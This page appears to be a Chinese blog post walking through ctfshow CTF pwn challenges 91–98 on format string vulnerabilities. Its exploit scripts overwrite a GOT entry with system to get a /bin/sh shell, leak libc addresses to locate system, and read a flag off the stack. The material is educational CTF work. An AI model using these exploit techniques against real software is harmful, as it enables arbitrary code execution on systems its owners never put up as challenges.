@@ -1,0 +1,269 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn91-100格式化字符串 | zx's Blog</title><meta name="author" content="zx"><meta name="copyright" content="zx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x02 格式化字符串pwn91啊，好累 题目tips：开始格式化字符串了，先来个简单的吧  开了canary和nx  可以看到偏移值是7，就是说输入的aaaa和0x61616161之间隔了七个位置 aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p就是用来显示偏移值的一个方法 萌新可以先看这个https:&#x2F;&#x2F;www.cnblogs.com&#x2F;falling-du">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn91-100格式化字符串">
+<meta property="og:url" content="https://zx2023qj.github.io/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html">
+<meta property="og:site_name" content="zx&#39;s Blog">
+<meta property="og:description" content="0x02 格式化字符串pwn91啊，好累 题目tips：开始格式化字符串了，先来个简单的吧  开了canary和nx  可以看到偏移值是7，就是说输入的aaaa和0x61616161之间隔了七个位置 aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p就是用来显示偏移值的一个方法 萌新可以先看这个https:&#x2F;&#x2F;www.cnblogs.com&#x2F;falling-du">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zx2023qj.github.io/img/3.jpg">
+<meta property="article:published_time" content="2024-09-05T15:47:36.000Z">
+<meta property="article:modified_time" content="2024-09-05T16:42:09.265Z">
+<meta property="article:author" content="zx">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zx2023qj.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/3.jpg"><link rel="canonical" href="https://zx2023qj.github.io/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn91-100格式化字符串',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-06 00:42:09'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/3.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="zx's Blog"><span class="site-name">zx's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn91-100格式化字符串</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-05T15:47:36.000Z" title="发表于 2024-09-05 23:47:36">2024-09-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-05T16:42:09.265Z" title="更新于 2024-09-06 00:42:09">2024-09-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn91-100格式化字符串"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="0x02-格式化字符串"><a href="#0x02-格式化字符串" class="headerlink" title="0x02 格式化字符串"></a>0x02 格式化字符串</h3><h4 id="pwn91"><a href="#pwn91" class="headerlink" title="pwn91"></a>pwn91</h4><p>啊，好累</p>
+<p>题目tips：开始格式化字符串了，先来个简单的吧</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240903192534315.png" alt="image-20240903192534315"></p>
+<p>开了canary和nx</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240903212346797.png" alt="image-20240903212346797"></p>
+<p>可以看到偏移值是7，就是说输入的aaaa和0x61616161之间隔了七个位置</p>
+<p>aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p就是用来显示偏移值的一个方法</p>
+<p>萌新可以先看这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17858030.html%EF%BC%8C%E7%9C%8B%E5%AE%8C%E4%B9%8B%E5%90%8E%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%AF%94%E8%BE%83%E5%A5%BD%E4%B8%80%E7%82%B9">https://www.cnblogs.com/falling-dusk/p/17858030.html，看完之后可能会比较好一点</a></p>
+<p>也可以gdb调试一下，看一下到底是输出了什么。</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240903214350903.png" alt="image-20240903214350903"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240903214356248.png" alt="image-20240903214356248"></p>
+<p>可以看到是向着高位地址的方向读取的，也就是说有可能把canary读出来，不过对于本题的意义倒不是很大。</p>
+<p>本题如果不用集成好的函数写的话，应该是用的%n，然后计算位于bss段的变量daniu和偏移量7之间的关系，通过泄露出的地址计算距离之间的，然后将bss段覆盖为想要的数值。</p>
+<p>不过这里还是按照官方wp的解法写，直接上工具！真好吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn91&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28174)</span><br><span class="line"></span><br><span class="line">offset = 7</span><br><span class="line">daniu = 0x0804B038</span><br><span class="line">payload = fmtstr_payload(offset,&#123;daniu:6&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn92"><a href="#pwn92" class="headerlink" title="pwn92"></a>pwn92</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240903220119824.png" alt="image-20240903220119824"></p>
+<p>这下真是保护全开了，64位保护全开</p>
+<p>代码有点多，虽然好像蛮多是示例的，但是懒得看，先下班</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904153652884.png" alt="image-20240904153652884"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">这个代码片段展示了 C 语言中 `printf` 函数的多种格式化输出功能。下面是对每一行代码的详细解析：</span><br><span class="line"></span><br><span class="line">1. `printf(&quot;Hello CTFshow %%\n&quot;);`</span><br><span class="line">- 作用：打印字符串 `Hello CTFshow %`，其中 `%%` 是打印一个 `%` 字符的转义序列。</span><br><span class="line">- 输出：`Hello CTFshow %`</span><br><span class="line"></span><br><span class="line">2. `puts(&quot;Hello CTFshow!&quot;);`</span><br><span class="line">- 作用：`puts` 函数输出一个字符串并自动在末尾加上换行符。</span><br><span class="line">- 输出：`Hello CTFshow!`</span><br><span class="line"></span><br><span class="line">3. `printf(&quot;Num : %d\n&quot;, 114514LL);`</span><br><span class="line">- 作用：`%d` 是整数格式化说明符，输出一个十进制整数。`114514LL` 是一个长整型常量，但会被 `%d` 格式化为普通整型输出。</span><br><span class="line">- 输出：`Num : 114514`</span><br><span class="line"></span><br><span class="line">4. `printf(&quot;%s %s\n&quot;, &quot;Format&quot;, &quot;Strings&quot;);`</span><br><span class="line">- 作用：`%s` 是字符串格式化说明符，按顺序输出两个字符串 `&quot;Format&quot;` 和 `&quot;Strings&quot;`。</span><br><span class="line">- 输出：`Format Strings`</span><br><span class="line"></span><br><span class="line">5. `printf(&quot;%12c\n&quot;, 65LL);`</span><br><span class="line">- 作用：`%c` 是字符格式化说明符，输出对应 ASCII 值的字符。`65LL` 对应 ASCII 字符 `&#x27;A&#x27;`。`%12c` 表示字符占据 12 个字符宽度的位置，左边用空格填充。</span><br><span class="line">- 输出：`           A` （前面有 11 个空格）</span><br><span class="line"></span><br><span class="line">6. `printf(&quot;%16s\n&quot;, &quot;Hello&quot;);`</span><br><span class="line">- 作用：`%s` 输出字符串，`%16s` 表示字符串占据 16 个字符宽度，左边用空格填充。</span><br><span class="line">- 输出：`           Hello` （前面有 11 个空格）</span><br><span class="line"></span><br><span class="line">7. `printf(&quot;%12c%n\n&quot;, 65LL, v1);`</span><br><span class="line">- 作用：</span><br><span class="line">  - `%12c` 打印字符 `&#x27;A&#x27;`，左边用空格填充，总宽度为 12。</span><br><span class="line">  - `%n` 并不打印任何内容，而是将当前已经打印的字符数存储在变量 `v1` 中。</span><br><span class="line">  - 假设 `v1` 是一个指向整型变量的指针，那么 `v1` 将存储 12，这是因为打印了 12 个字符。</span><br><span class="line">- 输出：`           A` （前面有 11 个空格），`v1` 的值为 12。</span><br><span class="line"></span><br><span class="line">8. `printf(&quot;%16s%n\n&quot;, &quot;Hello!&quot;, v1);`</span><br><span class="line">- 作用：</span><br><span class="line">  - `%16s` 打印字符串 `&quot;Hello!&quot;`，左边用空格填充，总宽度为 16。</span><br><span class="line">  - `%n` 将当前已打印的字符数（即 16）存储在 `v1` 中。</span><br><span class="line">  - 假设 `v1` 是一个指向整型变量的指针，那么 `v1` 的值将被更新为 16。</span><br><span class="line">- 输出：`           Hello!` （前面有 10 个空格），`v1` 的值被更新为 16。</span><br><span class="line"></span><br><span class="line">9. `printf(&quot;%2$s %1$s\n&quot;, &quot;Format&quot;, &quot;Strings&quot;);`</span><br><span class="line">- 作用：</span><br><span class="line">  - `%2$s` 和 `%1$s` 分别指定第二个和第一个参数的字符串输出。</span><br><span class="line">  - 这会输出 `&quot;Strings Format&quot;`，而不是默认顺序的 `&quot;Format Strings&quot;`。</span><br><span class="line">- 输出：`Strings Format`</span><br><span class="line"></span><br><span class="line">10. `printf(&quot;%42c%1$n\n&quot;, v1);`</span><br><span class="line">- 作用：</span><br><span class="line">  - `%42c` 打印 42 个空格字符（如果 `v1` 是一个有效的字符值）。</span><br><span class="line">  - `%n` 将当前已打印的字符数（即 42）存储在 `v1` 中。如果 `v1` 是指向整型变量的指针，它将被赋值为 42。</span><br><span class="line">- 输出：42 个空格字符，然后 `v1` 被设置为 42。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">这个代码片段展示了 `printf` 的各种格式化功能，包括字符和字符串格式化、宽度控制、参数位置交换、以及 `n` 格式说明符来存储字符数。`%n` 和 `%m$n` 格式化功能尤其用于一些高级用例，比如格式化字符串攻击的研究。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904153733954.png" alt="image-20240904153733954"></p>
+<p>fgets读取flag的内容到s，scanf读取format作为printf的参数，输出s，只要输入%s就可以了</p>
+<p>脚本都省了，直接nc，然后输入%s即可</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904155616272.png" alt="image-20240904155616272"></p>
+<h4 id="pwn93"><a href="#pwn93" class="headerlink" title="pwn93"></a>pwn93</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904154232093.png" alt="image-20240904154232093"></p>
+<p>64位保护全开</p>
+<p>代码基本就是知识点吧，自己找ai解释一下就完了</p>
+<p>nc连接之后输入7获取flag</p>
+<h4 id="pwn94"><a href="#pwn94" class="headerlink" title="pwn94"></a>pwn94</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904163600253.png" alt="image-20240904163600253"></p>
+<p>32位程序，开启了nx</p>
+<p>解题思路应该是用%n修改栈的内容，然后调用system函数getshell</p>
+<p>好吧，其实并不是这样，官方的wp是很神奇的解法（反正不像是我能想到的）</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904172145197.png" alt="image-20240904172145197"></p>
+<p>偏移是6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn94&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28179)</span><br><span class="line"></span><br><span class="line">offset = 6</span><br><span class="line">#printf_sym = elf.sym[&#x27;printf&#x27;]</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">#printf_plt = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">#print(hex(printf_sym))</span><br><span class="line">#print(hex(printf_got))</span><br><span class="line">#print(hex(printf_plt))</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">bin_sh = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(bin_sh)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>elf.sym[]和elf.plt[]是一个东西，可以看到将printf的got表修改为指向system的地址，所以在执行printf(buf)时就会变成system(buf)</p>
+<h4 id="pwn95"><a href="#pwn95" class="headerlink" title="pwn95"></a>pwn95</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904173318610.png" alt="image-20240904173318610"></p>
+<p>32位程序，开启了nx</p>
+<p>相比于上题最大的不同应该是没有system函数</p>
+<p>解题思路：可以试试泄露函数地址然后获得libc库，然后再得到system函数的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn95&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28304)</span><br><span class="line">#p = process(&#x27;../pwn95&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 6</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">printf_plt = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">bin_sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line"># 泄露出printf的地址，%6$s就是打印出第六个参数的意思</span><br><span class="line">payload = p32(printf_got) + &quot;%&#123;&#125;$s&quot;.format(offset).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc = LibcSearcher(&quot;printf&quot;,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(bin_sh)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>理论上方法是这么个方法，但是不知道为什么打的时候容器总是会crash，所以就拿不到flag了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def exec_fmt(payload):</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    return info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"># 自动计算偏移可以加上这一段</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn96"><a href="#pwn96" class="headerlink" title="pwn96"></a>pwn96</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904213737488.png" alt="image-20240904213737488"></p>
+<p>32位程序，relro为partial，开启了nx</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904215017724.png" alt="image-20240904215017724"></p>
+<p>直接上重点，就是通过%p去读栈上的内容，v3就是flag，而且存在栈上，那么通过格式化字符串漏洞就可以读取栈上的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = gdb.debug(&quot;../pwn96&quot;,&quot;b main&quot;)</span><br><span class="line">#p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28214)</span><br><span class="line">flag=b&#x27;&#x27;</span><br><span class="line">for i in range(6,6+12):</span><br><span class="line">	payload=&#x27;%&#123;&#125;$p&#x27;.format(str(i))</span><br><span class="line">	p.sendlineafter(&#x27;$ &#x27;,payload)</span><br><span class="line">	aim = unhex(p.recvuntil(b&#x27;\n&#x27;,drop=True).replace(b&#x27;0x&#x27;,b&#x27;&#x27;))</span><br><span class="line">	flag += aim[::-1]</span><br><span class="line">	print(flag)</span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>照抄的官方wp，其中手动转码一下也不是不行，记得大小端序就好了</p>
+<h4 id="pwn97"><a href="#pwn97" class="headerlink" title="pwn97"></a>pwn97</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904221503104.png" alt="image-20240904221503104"></p>
+<p>relro为partial，canary和nx都开启，32位程序</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904222249003.png" alt="image-20240904222249003"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904222259037.png" alt="image-20240904222259037"></p>
+<p>应该是通过printf函数漏洞修改check来达到输出flag的目的</p>
+<p>解题思路：先计算偏移值，由于不需要触发exit，所以s中不需要shutdown，需要触发printf函数，所以s中不需要cat &#x2F;ctfshow_flag</p>
+<p>通过计算可以得到偏移值为11，当然也可以自动计算偏移（虽然我自动计算没算出来）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p = gdb.debug(&quot;../pwn96&quot;,&quot;b main&quot;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28166)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = 11</span><br><span class="line">check = 0x0804B040</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,&#123;check:1&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn98"><a href="#pwn98" class="headerlink" title="pwn98"></a>pwn98</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904224107940.png" alt="image-20240904224107940"></p>
+<p>relro为partial，canary和nx都开启，32位程序</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904225443039.png" alt="image-20240904225443039"></p>
+<p>解题思路：这个一眼顶针啊，先使用gets读取一个s，然后printf泄露出canary的值，再用gets指向后门函数__stack_check</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904225801287.png" alt="image-20240904225801287"></p>
